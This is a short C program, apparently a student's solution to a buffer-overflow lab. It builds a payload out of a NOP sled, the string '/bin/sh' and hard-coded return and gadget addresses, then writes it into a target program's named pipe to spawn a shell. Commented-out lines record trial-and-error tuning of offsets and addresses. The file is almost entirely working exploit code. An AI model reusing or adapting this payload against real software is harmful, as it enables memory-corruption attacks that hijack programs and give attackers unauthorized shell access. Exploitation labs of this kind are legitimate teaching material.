#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  //char buf[251]; 
  //char add[120];
  //char y[8] = "\x05\x04\xbf\xbf\x90\x90\x90\x90";
  char strfinal[195] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90/bin/sh\x7d\x04\xbf\xbf\x90\x90\x90\x90\xe1\xa0\xb9\xbb\x84\x04\xbf\xbf\xd4\xbe\xb3\xbb\x88\x2d\xb5\xbb\xe1\xa0\xb9\xbb\x3b\x40\x40\x40\xe8\x27\xac\xbb\x8c\x9d\xa9\xbb\x79\x04\xbf\xbf\x80\x04\xbf\xbf\x84\x04\xbf\xbf";
  //memset(y + 4, 0, 4); 
  
  //bzero(strfinal+139,8);
  //strcpy(strfinal+139,"\x3b\x00\x00\x00");
  //strcpy(strfinal+139,"\xe8\x27\xac\xbb");
  
		  //memcpy(add, str, 8);BBAC27E8
  //int i; BBB9A0E1
  //for(i = 1; i < 15; i++)
  //{i BBB5B992 BBBAA422
//	memcpy(add + (8 * i), "\x8c\x9c\xbb\x00\x00\x00\x00",8);
 // }  0xBBA99D8C
  //memcpy(strfinal+139,"\x8c\x9c\xbb\x90\x90\x90\x90",8);
  //memcpy(strfinal+147,"\x8c\x9c\xbb\x90\x90\x90\x90",8); 
  //memcpy(strfinal+155,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+163,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+171,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+179,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+187,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+195,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+203,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+211,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+219,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+227,"\x8c\x9c\xbb\x00\x00\x00\x00",8); 
  //memcpy(strfinal+235,"\x8c\x9c\xbb\x00\x00\x00\x00",8);
 // memcpy(strfinal+243,"\x8c\x9c\xbb\x00\x00\x00\x00",8);  
 // strcpy(buf+131,add);
  writecmd(PIPEPATH, strfinal);
  return 0;
}
